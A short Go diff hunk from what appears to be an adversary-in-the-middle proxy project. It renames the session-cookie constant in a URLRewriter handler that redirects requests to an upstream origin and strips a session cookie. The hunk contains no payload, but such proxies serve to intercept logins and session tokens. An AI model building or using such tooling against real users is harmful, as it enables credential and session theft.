@@ -23,7 +23,7 @@ func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 		req.URL.Host = origin
 		req.URL.Scheme = ph.UpstreamScheme
 	}
-	stripCookie(req, sessionCookieName)
+	stripCookie(req, proxy.SessionCookieName)
 	return nil
 }
 
